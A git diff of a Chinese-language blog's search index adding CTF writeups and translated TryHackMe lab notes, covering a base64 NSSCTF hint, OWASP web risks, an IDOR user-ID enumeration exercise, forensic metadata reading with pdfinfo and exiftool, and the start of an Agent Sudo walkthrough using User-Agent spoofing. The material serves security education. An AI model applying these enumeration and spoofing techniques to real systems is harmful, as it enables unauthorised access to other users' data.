EJ2lQOjEzbS9MNXQ+RTQvcFRnNDxBUmlPOFBgNWZCTFFKdS9ub0VDRC1vXE40PicsdDJEQUUjNTxXJXA8QGZhWjVcPE1TL1MkUl0sQmQ6LTVVMStxM2IydEs0WzFUNTppZm8oPF91dDgxaEIwVjVWPWNHREdhVlouN2NqMTNeYyM5NVcoNWg1WXRXWjY2cEFsNF0sKj01Q0hnYzU/aD5QRGE3YEM4MUhdQDUkMjwuNUJvUEA9JmlbNzRdNkUiQDZINVI3OU5ZUTVCXklBNTxXW2I8QFRZKUJLb0k6Lm5XVF01JzhTJ0ZYOFh0M106Om4uOUFfWzU/cDwyNEZKX0lAVlM6Vy42Z15FNSdUdDlAOEpbRi9qPTIzNVVuSTM0YGpwdDJDXkBuM14tam5DMWdoIzVYSmRhNXNuXl4vb3Q7Y0QrNk5VMUk1QU01c0pkX0YmWyc3PEM5a1Y0PWplYDVBal5kN1AmN1U1QC1XcDQ+J3FiQXBsQCsuOFAxUjxAZmFSNVw8bkUvUyRSbEJMUTAvPEFSYEg3cWJlSjY/dDdZMC5VcnE8QF8nKTQ9akJILjllSzMuTnJNKDxfLUZENVRyNkxEMElbL0BrKGVvNiRRQyo1VHNpVjV0NTAqNVxqXDU0RSFxRjgxQTdeNSQ5YGk1QyxcPjU6cEQ+N1VCZVBANmxNNTNjUzFeRC5tYzQ5TzllW0A2bjNGQk1WVEouN1p1YTUnOCw6MG1QNkYzXj9uKzxdRUtVODE/WWU0JyxXRTxfP1lHPElAXmk2Il9LWjUjWCdpL2o7Wy5EQ1tGcjVYQV8oNXNSLEJAbVhObTtgSVpsNSdMNycyREpcaC9vT3M6LXJPPnQxM20vKzVyQ0gnNzowcSw8RSEzTDhQYUlzQktdb203Nj5VLEREWGFaNCVYMEYwTikxXSw6UWwjPEBmX0w0WjVldTFJM2xILFZFOzs1VTErbTNfKihENFsxVm86aTBLIjxBUmk5MWhLNlcuOUE7Vi5OciM7LjhPODY1WElxVi46UVU9NVtkZjI0RC44QTVVQW9XNUNIVS41QUZNPURhNm9cODFIXGw1JDlhVTFncmRYPSZpWzc4cCMyUUA3aTEkMWhCZjo1QWpiNTNGP0gpPEBWOTosQV4+Ii44Ti9YNSc4VCxGJ0M3YDc4SS9xLjlBTic3cUZiXTUiNyMuMWhnaSstWjJGZjUnTGEiNXVmVUUvak5HcTxgaCg6NF0+XTU3WEhqVjNcRjxDQzFnais1WEpkYTRZZVdHL3BDU2dFKCtEMjVDK1xCNXQ+MG9HcXM6dS1waD9aND4nb19BbyhYaTc5YVtgPEdiJEA0XT45akFwW2ZXLDpSKSE8QGZhUzU8citfME11K24+Vjk7RzRZcDpyMUYjZUYxaWNrckJMP1xsPGBpSG4zXztGYzVVbkY0MioiZWUuOFc8RDVUclI6RDBCNT8sWGJjYDYkUWdDNUBJKWw2bz9IJDc8RGpDNj1pa0I4MVFjMTV0PFNCNVRyTDs1OnAvRDc2PFNSQDZsUFw1VTpAbjxeOitCOU87RjU8QEQuJCxBXj4iNiRQMiY1PFc3ZC09U2ZRM14tWT0uNXNqXzgxQTdRNCcsV0U8YDJoNy4hbmw7NiJfS1o1dWZXXzFPKURfRENbRnI1WEFYRDQoXjBiQG1YVFREQlZoQjVYSmFkMmNFZFM3NnQ5VEQnaVA6MTNrUXM1dD4/aC9wVkBqPEUhKm84UGdeOkZYOGJgL25vRUM8YW5JMDQlVnFBQXBkbEgsO0U1SDtgWk5qNVwiT10xSTNgTT5WS0F1NVUxK201VTk2JzRbMVZvOmokKVsuOE8vKjNiTC9vP1JbVG9ER09KWTxfNVY1NVt1aV41Vyg1aDU9Sl4oNjZwQWw1WEpAMTVDP08tNUFGTT1EYTZvUjgxSF1INSQyPC45L0F0RjZTVyJUOHAjMlFANylZWDc5TmJDNUFhMXE0QUtaTjxBI3EtQktvRWgubk4+ZDUnOFMnRidDN1MzXUxGcC5rcyVSNT9wPDI1IjclaUBWQS5VLiEmcCk1J1R0OT9SbWpAMWUoZSY1VW5IajRgajRsN1hIajdAVGQiXERDW3B1NVhlM3UuV0pOZDc2dDNIRStVVWQxSSMsNTQoO19uR3JmayM8Qzo7JDRdPlgpNUFqWUQ3UCY3UjxhbkknNCVXPWAwTikxTS44UDFRPGAhNDw1PHIuTC9TJi4pPlY5O0c0WW5UVzdxYmReMWljblg+VidlSjw/a0whNVVTWkcuOWVLMzIqIyxBLjhPLyIzYjpFNURDSm06NVg4WGI2Nm9RKjVAJXU8NUNHIlc1XSdoNzUlLi84ODFIXTA1dDxTQTVDLVVaNTpwO0w3VUJlUD9AIjdxM2NULmZELlpdbzNGP0sjQ2ZYamZCTGMnJjxfLEcnNSNgZG4wbVBKdTNeP24rPF1FS1U3cXM+ZzQnKzdcPGAyaDcuISZwQDYiX0taNSNYJ2kxTyk7b0RDW0ZyM0JnXDo0KFUqYUBtWEtGO2FGaTU1WDhbRTJjWD84PkIhaE0tck1qODEzbS8rNXQ+P2kuN1w7MzxFITNLOFBhSXRGWDFOYTc2PWdiPGFuSHA0JVc9ZEA2LlwyLDw4ZVA9QSg4KzRaNWV1MUkzYFAsQXBfJTU6JiIxM18zLkE0WzFWbzpocz51PEFSTj4xaEIwWjVVbktDREdhVlo8YCE0NzVYSXQ7NVZ1YkA1W2RmMUUkXExVNUAmJWQuOEQ/ZTVBRk09RGE2b1I4MUhdSDUlUUJcM14sckVFQUNOYDhwIzJRQDcpW3I1VTpAbjVAJVEkNEFLUXA8QFRZODVCcDc8Lm5NclU1PFc+I0YnQ0BFM11MPikuOUFOJjVYbSVINCcqbjxAVlRkWS48bj9yNVg4NFg/Um1qLy9qTjxTNVVuS0M0XT1tSzdYSGdwM1xGX15DMWdpcjUnTD0/Nj5LbWAvb3Q7VS1yT1NZOWQ7RHA1c0pqK0dxcWE1PEM6KDk0PidvX0Fua2ErN1AmN1I8YW5JJzRFIi8wMkNMN1AuOFA0NzxAaD8sNTxyLjwvUyYuKUYkKllXLT1LMl03cWJnYDNfcyRVQkw/Kjc8YGlIbTVVUzk1LjllSE41O1FNYS44VzxANVRyUjpEQlc9Q0BrKFYwNjZvUSo1QCYldDQpJFdNLXQtRmg2PWliUjgxSj1fNXQ8U0E1Qy1VWjUjPjY2NzY+NCxANmxQXDVVOkBwLjZmTSg5TzllXy5XU2clQkxjJEJEZz1OZzU8V15xMG1QSnUzXyE0RS41cyYhNVhtJis0JyxaODAvJDRALiEmXVU2Il9LRTUjWDBaLXQsTG41QSI0VzRgaT5GLjclNWwzRThbJA==</span><br></pre></td></tr></table></figure>
+<p>最终得到的提示是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你所上传的即是命令</span><br></pre></td></tr></table></figure>
+<p>看了一眼框架，python的flask，直接读环境</p>
+<p><img src="https://s2.loli.net/2024/02/21/n2jT4w5N6gbPhtx.png" alt=""></p>
+<p>乐（</p>
 ]]></content>
       <categories>
-        <category>Tryhackme</category>
+        <category>Writeup</category>
       </categories>
       <tags>
-        <tag>Tryhackme</tag>
+        <tag>NSSCTF Round</tag>
       </tags>
   </entry>
   <entry>
@@ -2267,6 +2270,37 @@ FFI是PHP中调用C代码的手段
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">您可能会看到渗透测试被称为渗透测试和道德黑客。渗透测试人员的工作职责是测试公司内部系统和软件的安全性 - 通过尝试通过系统化的黑客活动发现缺陷和漏洞来实现这一目标。渗透测试人员利用这些漏洞来评估每个实例中的风险。公司随后可以利用这些见解来纠正问题，以防止真实的网络攻击。</span><br><span class="line"></span><br><span class="line">责任</span><br><span class="line">对计算机系统、网络和基于Web的应用程序进行测试</span><br><span class="line">执行安全评估、审核和分析政策</span><br><span class="line">评估并报告见解，建议攻击预防措施</span><br><span class="line">学习路径</span><br><span class="line">TryHackMe的学习路径将为您提供基础的技术知识和实践经验，这对于成为一名成功的渗透测试人员至关重要。</span><br><span class="line"></span><br><span class="line">初级渗透测试员</span><br><span class="line">攻击性渗透测试</span><br></pre></td></tr></table></figure>
 <h4 id="Red-Teamer">Red Teamer</h4>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">红队员与渗透测试人员有相似之处，但职责更加具有针对性。渗透测试人员旨在发现系统中的许多漏洞，以保持网络防御的良好状态，而红队员则旨在测试公司的检测和响应能力。这项工作要求模仿网络犯罪分子的行动，模拟恶意攻击，保持访问权限，并避免被检测到。红队评估通常由公司外部的团队负责，可以持续长达一个月。它们通常最适合已建立成熟安全程序的组织。</span><br><span class="line"></span><br><span class="line">责任</span><br><span class="line">模拟威胁行为者的角色，发现可利用的漏洞，保持访问权限并避免被检测到</span><br><span class="line">评估组织的安全控制、威胁情报和事件响应程序</span><br><span class="line">评估并报告见解，提供可行的数据供公司避免真实世界中的情况</span><br><span class="line">学习路径</span><br><span class="line">TryHackMe的学习路径将为您提供基础的技术知识和实践经验，这对于成为一名成功的红队员至关重要。</span><br><span class="line"></span><br><span class="line">初级渗透测试员</span><br><span class="line">攻击性渗透测试</span><br><span class="line">红队员</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Tryhackme</category>
+      </categories>
+      <tags>
+        <tag>Tryhackme</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tryhackme_Diary-2</title>
+    <url>/2024/02/22/Tryhackme_Diary-2/</url>
+    <content><![CDATA[<h1>Tryhackme_Diary-2</h1>
+<h2 id="Introduction-to-Offensive-Security">Introduction to Offensive Security</h2>
+<h3 id="Web-Application-Security">Web Application Security</h3>
+<h4 id="Introduction">Introduction</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每个人都在自己的计算机上使用不同的程序。一般来说，程序在我们的计算机上运行，利用我们计算机的处理能力和存储空间。而且，要使用一个程序，我们需要先安装它。但是如果我们可以在不安装的情况下使用任何程序呢？</span><br><span class="line"></span><br><span class="line">网络应用就像一个“程序”，只要我们有现代标准的网络浏览器，比如Firefox、Safari或Chrome，我们就可以使用它。因此，与其安装每个你需要的程序，你只需要浏览相关的页面。以下是一些网络应用的例子：</span><br><span class="line"></span><br><span class="line">- 网络邮件，比如Tutanota、Protonmail、Outlook和Gmail</span><br><span class="line">- 在线办公套件，如Microsoft Office 365（Word、Excel和PowerPoint）、Google Drive（Docs、Sheets和Slides）和Zoho Office（Writer、Sheet和Show）</span><br><span class="line">- 网上购物，如Amazon.com、AliExpress和Etsy</span><br><span class="line">成千上万的其他例子提供了各种各样的服务。其他例子包括在线银行业务、货币转账、天气预报和社交媒体。</span><br><span class="line"></span><br><span class="line">网络银行业务网络应用</span><br><span class="line"></span><br><span class="line">网络应用的概念是它是运行在远程服务器上的程序。服务器是指持续运行以“为客户服务”的计算机系统。在这种情况下，服务器将运行一种特定类型的程序，可以通过网络浏览器访问。</span><br><span class="line"></span><br><span class="line">考虑一个在线购物应用程序。网络应用程序将从数据库服务器读取有关产品及其详细信息的数据。数据库用于以有组织的方式存储信息。例如，关于产品、客户和发票的信息。数据库服务器负责许多功能，包括读取、搜索和写入数据库。在线购物网络应用可能需要访问一个以上的数据库，例如：</span><br><span class="line"></span><br><span class="line">- 产品数据库：这个数据库包含产品的详细信息，如名称、图片、规格和价格。</span><br><span class="line">- 客户数据库：它包含与客户相关的所有详细信息，如姓名、地址、电子邮件和电话号码。</span><br><span class="line">- 销售数据库：我们希望在这个数据库中看到每个客户购买了什么以及他们是如何支付的。</span><br><span class="line"></span><br><span class="line">我们已经看到了任何在线购物系统中存储的大量信息。假设攻击者成功地利用了网络应用程序并窃取了客户数据库，这将给公司和其客户带来重大损失。</span><br><span class="line"></span><br><span class="line">下面的图像显示了在在线购物网站上搜索商品的过程。在最简单的版本中，搜索将分为四个步骤：</span><br><span class="line"></span><br><span class="line">- 用户在搜索栏中输入商品名称或相关关键字。网络浏览器将搜索关键字发送到在线购物网络应用程序。</span><br><span class="line">- 网络应用程序查询（搜索）提交的关键字的产品数据库。</span><br><span class="line">- 产品数据库将匹配所提供的关键字的搜索结果返回给网络应用程序。</span><br><span class="line">- 网络应用程序将结果格式化为友好的网页并返回给用户。</span><br><span class="line"></span><br><span class="line">从用户的角度来看，他们只会访问一个优雅的在线商店，所有的技术基础设施都是隐藏的。</span><br><span class="line"></span><br><span class="line">访问网络应用程序时，技术基础设施被隐藏起来</span><br><span class="line"></span><br><span class="line">许多公司提供漏洞赏金计划。漏洞赏金计划允许公司为发现其系统中的安全漏洞（弱点）的任何人提供奖励。主要条件是找到的漏洞必须在漏洞赏金范围和规则内。谷歌、微软和Facebook等公司都有漏洞赏金计划。发现一个漏洞可以让你赚取从几百美元到数万美元不等的奖金，具体取决于漏洞的严重程度，也就是你发现的弱点。</span><br></pre></td></tr></table></figure>
+<h4 id="Web-Application-Security-Risks">Web Application Security Risks</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设您想要从一个在线商店购买商品。在这个 Web 应用程序上，您期望能够执行一些特定的功能。最直接的情况下，在线订购可能会按照以下步骤进行：</span><br><span class="line"></span><br><span class="line">1. 在网站上登录。 2. 搜索产品。 3. 将产品添加到购物车中。 4. 指定送货地址。 5. 提供支付详情。</span><br><span class="line"></span><br><span class="line">针对 Web 应用程序的攻击主要有几个常见的类别。考虑以下步骤及相关的攻击。</span><br><span class="line"></span><br><span class="line">在网站上登录：攻击者可以尝试通过尝试许多密码来发现密码。攻击者会使用一个长列表的密码和自动化工具来测试它们与登录页面的匹配情况。</span><br><span class="line"></span><br><span class="line">搜索产品：攻击者可以尝试通过在搜索词中添加特定字符和代码来突破系统。攻击者的目标是使目标系统返回它不应该返回的数据或执行它不应该执行的程序。</span><br><span class="line"></span><br><span class="line">提供支付详情：攻击者会检查支付详情是否以明文形式发送或使用弱加密。加密是指使数据在不知道密钥或密码的情况下无法读取。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我们无法涵盖所有内容，但我们将介绍 OWASP 十大的一些正式类别。如果这些技术对您来说听起来有些陌生，请不用担心；TryHackMe 将向您介绍每个漏洞。</span><br><span class="line"></span><br><span class="line">识别和身份验证失败：识别指的是唯一识别用户的能力。而身份验证则指的是证明用户是其所声称的人的能力。在线商店必须在用户使用系统之前确认用户的身份并对其进行身份验证。然而，这一步骤容易受到不同类型的弱点的影响。例如：</span><br><span class="line"></span><br><span class="line">允许攻击者使用暴力破解，即使用自动化工具尝试许多密码以查找有效的登录凭据。</span><br><span class="line"></span><br><span class="line">允许用户选择弱密码。弱密码通常容易被猜到。</span><br><span class="line"></span><br><span class="line">以明文形式存储用户的密码。如果攻击者成功读取包含密码的文件，我们不希望他们能够了解存储的密码。</span><br><span class="line"></span><br><span class="line">损坏的访问控制：访问控制确保每个用户只能访问与其角色或工作相关的文件（文档、图像等）。例如，您不希望市场部门的某人访问（阅读）财务部门的文档。与访问控制相关的示例漏洞包括：</span><br><span class="line"></span><br><span class="line">未能应用最小权限原则，并给予用户比他们需要的更多的访问权限。例如，一个在线客户应该能够查看商品的价格，但他们不应该能够更改商品价格。</span><br><span class="line"></span><br><span class="line">通过使用其唯一标识符查看或修改其他人的帐户。例如，您不希望一个银行客户能够查看另一个客户的交易。</span><br><span class="line"></span><br><span class="line">能够以未经身份验证的用户的身份浏览需要身份验证（登录）的页面。例如，我们不能让任何人在登录前查看网络邮件。</span><br><span class="line"></span><br><span class="line">注入：注入攻击是指 Web 应用程序中的漏洞，其中用户可以将恶意代码作为其输入的一部分插入。此漏洞的一个原因是对用户输入的验证和清理不足。</span><br><span class="line"></span><br><span class="line">密码学失败：这个类别与密码学有关的失败。密码学关注的是数据的加密和解密过程。加密将明文转换为密文，对于没有密钥解密的人来说，密文应该是无法理解的。换句话说，加密确保没有人能够在不知道密钥的情况下读取数据。解密使用密钥将密文转换回原始明文。密码学失败的</span><br><span class="line"></span><br><span class="line">示例包括：</span><br><span class="line"></span><br><span class="line">以明文形式发送敏感数据，例如使用 HTTP 而不是 HTTPS。HTTP 是访问 Web 的协议，而 HTTPS 是 HTTP 的安全版本。其他人可以读取您通过 HTTP 发送的所有内容，但不能读取 HTTPS。</span><br><span class="line"></span><br><span class="line">依赖弱密码算法。一个旧的密码算法是将每个字母向后移动一位。例如，“TRY HACK ME” 变成 “USZ IBDL NF”。这个密码算法很容易被破解。</span><br><span class="line"></span><br><span class="line">对密码学函数使用默认或弱密钥。使用 1234 作为密钥的加密很容易被破解。</span><br><span class="line"></span><br><span class="line">这张图显示了一名顾客在线使用她的信用卡，信用卡号以明文形式发送。</span><br><span class="line"></span><br><span class="line">如果这些技术起初看起来有些复杂或高级，请不用担心。TryHackMe 专门提供了深入的房间，帮助您理解和实验针对 Web 应用程序的各种攻击。</span><br></pre></td></tr></table></figure>
+<h4 id="Practical-Example-of-Web-Application-Security">Practical Example of Web Application Security</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此任务将调查一个使用不安全的直接对象引用（IDOR）的易受攻击的网站。IDOR属于破坏访问控制的范畴。破坏访问控制意味着攻击者可以访问未针对他们的信息或执行未经授权的操作。考虑这样一个情况，一个 Web 服务器接收用户提供的输入来检索对象（文件、数据、文档），并且它们按顺序编号。假设用户有权限访问名为 IMG_1003.JPG 的照片。我们可能会猜到还有 IMG_1002.JPG 和 IMG_1004.JPG; 但是，即使我们弄清了它的名称，Web 应用程序也不应该提供给我们那张照片。通常，如果对输入数据放置了太多的信任，就会出现IDOR漏洞。换句话说，Web 应用程序不会验证用户是否有权限访问请求的对象。</span><br><span class="line"></span><br><span class="line">仅仅提供用户或产品的正确 URL 并不一定意味着用户应该能够访问该 URL。例如，考虑产品页面 https://store.tryhackme.thm/products/product?id=52。我们可以期望这个 URL 提供有关产品编号 52 的详细信息。在数据库中，项目将按顺序分配编号。攻击者将尝试其他数字，例如 51 或 53，而不是 52; 如果 Web 应用程序容易受到攻击，这可能会显示其他已退休或未发布的产品。</span><br><span class="line"></span><br><span class="line">让我们考虑一个更为关键的例子；URL https://store.tryhackme.thm/customers/user?id=16 将返回 id=16 的用户。同样，我们期望用户具有顺序编号。攻击者将尝试其他数字，并可能访问其他用户帐户。这种漏洞可能适用于顺序文件；例如，如果攻击者看到 007.txt，那么攻击者可能会尝试其他数字，例如 001.txt、006.txt 和 008.txt。同样，如果您是编号为 16 的ID，而编号为 17 的ID是另一个用户，通过将ID更改为 17，您可以看到属于另一个用户的敏感数据。同样，他们可以将ID更改为 16，并查看属于您的敏感数据。（当然，我们在这里假设系统容易受到IDOR攻击。）</span><br><span class="line"></span><br><span class="line">点击“查看站点”，让我们看看它是如何运作的。您将看到一个显示库存管理系统的页面。如果您点击“计划发货”选项卡，您会发现攻击者已经在破坏计划中成功地混淆了事情。请注意，他们将错误的轮胎发送到每条生产线上；例如，他们将摩托车轮胎和摩托车轮胎分配给了自行车装配！如果不加修复，所有轮胎都将错误地发送到错误的装配线。</span><br><span class="line"></span><br><span class="line">我们将黑客系统并撤消攻击者的步骤。在“您的活动”中，您可以看到一个用户的活动。我们有理由相信这个网站有IDOR漏洞。</span><br></pre></td></tr></table></figure>
+<p>这一块就是介绍了一个简单的用户遍历，通过get请求可以直接通过相关编号修改去实现用户遍历，最后还原即得flag</p>
+<p><img src="https://s2.loli.net/2024/02/23/KQwURGOTarhvCYB.png" alt="Tryhackme_2_1"></p>
+<h2 id="Introduction-to-Defensive-Security">Introduction to Defensive Security</h2>
+<h3 id="Intro-to-Digital-Forensics">Intro to Digital Forensics</h3>
+<h4 id="Introduction-To-Digital-Forensics">Introduction To Digital Forensics</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">取证是将科学应用于调查犯罪并确定事实的过程。随着计算机和智能手机等数字系统的使用和普及，涉及数字设备和媒体的调查衍生出了一个新的取证领域：计算机取证，后来演变为数字取证。</span><br><span class="line"></span><br><span class="line">想象以下情景。执法人员到达犯罪现场；然而，这个犯罪现场的一部分包括数字设备和媒体。数字设备包括台式电脑、笔记本电脑、数码相机、音乐播放器和智能手机等。数字媒体包括CD、DVD、USB闪存驱动器和外部存储等。会出现一些问题：</span><br><span class="line"></span><br><span class="line">警方应如何收集数字证据，如智能手机和笔记本电脑？如果计算机和智能手机正在运行，应该遵循什么程序？</span><br><span class="line">如何转移数字证据？在搬运计算机时是否有一定的最佳实践要遵循？</span><br><span class="line">如何分析收集到的数字证据？个人设备存储容量从几十吉字节到数千吉字节不等；如何分析这些数据？</span><br><span class="line"></span><br><span class="line">假设上图中的员工存在嫌疑，我们可以迅速看到可能与调查相关的数字设备。我们注意到一个平板电脑、一个智能手机、一台数码相机和一个USB闪存驱动器，还有一台台式电脑。这些设备中的任何一个都可能包含大量的信息，有助于调查。处理这些作为证据需要进行数字取证。</span><br><span class="line"></span><br><span class="line">更正式地说，数字取证是将计算机科学应用于对数字证据进行法律目的调查的过程。数字取证用于两种类型的调查：</span><br><span class="line"></span><br><span class="line">公共部门调查是由政府和执法机构进行的调查。它们将成为刑事或民事调查的一部分。</span><br><span class="line">私营部门调查是由公司机构进行的调查，通过分配一个私人调查员，无论是内部还是外包。它们是由企业政策违规引发的。</span><br><span class="line">无论是调查犯罪还是企业政策违规，一部分证据与数字设备和数字媒体有关。这就是数字取证发挥作用并尝试确定发生了什么事情的地方。没有经过训练的数字取证调查员，将无法正确处理任何数字证据。</span><br></pre></td></tr></table></figure>
+<h4 id="Digital-Forensics-Process">Digital Forensics Process</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作为数字取证调查员，你到达了类似上图所示的现场。作为数字取证调查员，你应该做什么？在获得适当的法律授权后，基本计划如下：</span><br><span class="line"></span><br><span class="line">1. 获取证据：收集数字设备，如笔记本电脑、存储设备和数码相机。（需要注意的是，如果笔记本电脑和计算机正在运行，它们需要特殊处理；然而，这超出了本房间的范围。）</span><br><span class="line">2. 建立证据保管链：适当填写相关表格（样本表格）。目的是确保只有授权调查人员能够访问证据，没有人可以篡改它。</span><br><span class="line">3. 将证据放入安全容器：你要确保证据不会被损坏。对于智能手机，你要确保它们无法访问网络，以防止远程擦除。</span><br><span class="line">4. 将证据运输到你的数字取证实验室。</span><br><span class="line"></span><br><span class="line">在实验室里，流程如下：</span><br><span class="line"></span><br><span class="line">1. 从安全容器中取出数字证据。</span><br><span class="line">2. 创建证据的取证副本：取证副本需要使用高级软件来避免修改原始数据。</span><br><span class="line">3. 将数字证据放回安全容器：你将在副本上工作。如果你损坏了副本，你可以随时创建一个新的副本。</span><br><span class="line">4. 开始在你的取证工作站上处理副本。</span><br><span class="line"></span><br><span class="line">上述步骤已经改编自《计算机取证和调查指南》第6版。</span><br><span class="line"></span><br><span class="line">更普遍地说，根据前国防计算机取证实验室主任Ken Zatyko的说法，数字取证包括：</span><br><span class="line"></span><br><span class="line">1. 正确的搜索授权：调查人员不能在没有适当的法律授权的情况下开始工作。</span><br><span class="line">2. 证据保管链：这是必要的，以便随时了解谁持有证据。</span><br><span class="line">3. 使用数学验证：使用一种特殊类型的数学函数，称为哈希函数，我们可以确认文件没有被修改。</span><br><span class="line">4. 使用经过验证的工具：数字取证中使用的工具应该经过验证，以确保它们能正常工作。例如，如果你正在创建磁盘的映像，你希望确保取证映像与磁盘上的数据完全相同。</span><br><span class="line">5. 可重复性：只要具备适当的技能和工具，数字取证的发现就可以被复现。</span><br><span class="line">6. 报告：数字取证调查以一份报告结束，展示了与案件相关的发现的证据。</span><br></pre></td></tr></table></figure>
+<h4 id="Practical-Example-of-Digital-Forensics">Practical Example of Digital Forensics</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们在数字设备上所做的一切，从智能手机到计算机，都会留下痕迹。让我们看看如何在后续的调查中利用这一点。</span><br><span class="line"></span><br><span class="line">我们的猫，Gado，被绑架了。绑匪给我们发送了一份请求的文档，格式为MS Word文档。我们已经将文档转换为PDF格式，并从MS Word文件中提取了图像以方便您查看。</span><br><span class="line"></span><br><span class="line">您可以下载附件到本地计算机进行检查；但是，为了您的方便，我们已将文件添加到AttackBox中。要跟随操作，请在AttackBox上打开终端，然后转到如下所示的目录。在以下终端输出中，我们更改了包含案例文件的目录。/root/Rooms/introdigitalforensics</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">root# cd /root/Rooms</span><br><span class="line">root# cd introdigitalforensics</span><br><span class="line">root# ls</span><br><span class="line">letter-image.jpg  ransom-letter.doc  ransom-letter.pdf  ransom-lettter-2.zip</span><br><span class="line">文档元数据</span><br><span class="line">当您创建一个文本文件时，操作系统会保存一些元数据，例如文件创建日期和上次修改日期。但是，如果您使用更高级的编辑器，例如MS Word，则文件的元数据会保留许多信息。有各种方法可以读取文件元数据；您可以在官方的查看器/编辑器中打开它们，也可以使用适当的取证工具。请注意，将文件导出到其他格式（例如）将保留原始文档的大多数元数据，具体取决于所使用的PDF编写程序。TXTPDF</span><br><span class="line"></span><br><span class="line">让我们看看我们可以从PDF文件中了解到什么。我们可以尝试使用程序读取元数据。Pdfinfo显示与PDF文件相关的各种元数据，例如标题、主题、作者、创建者和创建日期。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请使用安装。）考虑以下使用的示例。.pdfinfopdfinfopdfinfosudo apt install poppler-utilspdfinfo DOCUMENT.pdf</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ pdfinfo DOCUMENT.pdf </span><br><span class="line">创建者:        Microsoft® Word for Office 365</span><br><span class="line">生产者:       Microsoft® Word for Office 365</span><br><span class="line">创建日期:   Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">修改日期:        Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">标记:         yes</span><br><span class="line">用户属性: no</span><br><span class="line">嫌疑人:       no</span><br><span class="line">表单:           none</span><br><span class="line">JavaScript:     no</span><br><span class="line">页数:          20</span><br><span class="line">加密:      no</span><br><span class="line">页面大小:      595.32 x 841.92 pts (A4)</span><br><span class="line">页面旋转:       0</span><br><span class="line">文件大小:      560362 字节</span><br><span class="line">优化:      no</span><br><span class="line">PDF版本:    1.7</span><br><span class="line">PDF元数据清楚地显示了它是使用MS Word for Office 365于2018年10月10日创建的。</span><br><span class="line"></span><br><span class="line">照片EXIF数据</span><br><span class="line">EXIF代表可交换图像文件格式；这是一种将元数据保存到图像文件中的标准。每当您使用智能手机或数码相机拍照时，都会嵌入大量信息到图像中。以下是原始数字图像中可能包含的元数据示例：</span><br><span class="line"></span><br><span class="line">相机型号/智能手机型号</span><br><span class="line">图像捕获的日期和时间</span><br><span class="line">照片设置，例如焦距、光圈、快门速度和ISO设置</span><br><span class="line">由于智能手机配备有GPS传感器，因此在图像中找到嵌入的GPS坐标的可能性很高。 GPS坐标，即纬度和经度，通常会显示拍摄照片的地点。</span><br><span class="line"></span><br><span class="line">有许多在线和离线工具可用于读取图像的EXIF数据。其中一个命令行工具是。 ExifTool用于读取和写入各种文件类型的元数据，例如JPEG图像。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请</span><br><span class="line"></span><br><span class="line">使用安装。）在以下终端窗口中，我们执行了以读取此图像中嵌入的所有EXIF数据。exiftoolexiftoolexiftoolsudo apt install libimage-exiftool-perlexiftool IMAGE.jpg</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ exiftool IMAGE.jpg</span><br><span class="line">[...]</span><br><span class="line">GPS位置: 51度31&#x27;4.00&quot; N，0度5&#x27;48.30&quot; W</span><br><span class="line">[...]</span><br><span class="line">如果您将上述坐标搜索到在线地图上，您将了解有关此位置的更多信息。在Microsoft Bing Maps或Google Maps中搜索，会发现这些坐标表明该图像是在伦敦博物馆附近拍摄的。 （我们只替换了以使我们的搜索起作用。）我们注意到坐标在搜索页面上被转换为十进制表示：.51° 31&#x27; 4.00&quot; N，0° 5&#x27; 48.30&quot; Wdeg°51.517776, -0.09675</span><br><span class="line"></span><br><span class="line">使用或任何类似的工具，尝试找出绑匪拍摄其附加到文档中的图像的地点。街道的名称是什么？exiftool</span><br></pre></td></tr></table></figure>
+<p>这边给了例题，主要就是查找基本的exif信息，除了上述给出的工具，直接用010手撸都行，最简单的misc</p>
 ]]></content>
       <categories>
         <category>Tryhackme</category>
@@ -2366,6 +2400,115 @@ FFI是PHP中调用C代码的手段
 <p><img src="https://s2.loli.net/2024/02/25/tmTeXNpjWKaqfEy.png" alt=""></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ./3rd.txt</span><br></pre></td></tr></table></figure>
 <p><img src="https://s2.loli.net/2024/02/25/H7wTqBGDkIljEb8.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>Tryhackme</category>
+      </categories>
+      <tags>
+        <tag>Tryhackme</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tryhackme_Diary-5</title>
+    <url>/2024/03/05/Tryhackme_Diary-5/</url>
+    <content><![CDATA[<h1>Tryhackme_Diary-5</h1>
+<h2 id="Agent-Sudo">Agent Sudo</h2>
+<h3 id="Enumerate">Enumerate</h3>
+<ol>
+<li>
+<p>How many open ports?</p>
+<p>可能是因为网络延迟的问题，导致开始的时候一个端口都没扫描出来，延时可以适当开高一点点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/03/05/pV4LatyfSXNCl35.png" alt="Tryhackme_5_1"></p>
+</li>
+<li>
+<p>How you redirect yourself to a secret page?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user-agent</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/03/05/OlMXjakTzYwE74N.png" alt="Tryhackme_5_2"></p>
+</li>
+<li>
+<p>What is the agent name?</p>
+<p>user-agent参数为C的时候，可以收到回复</p>
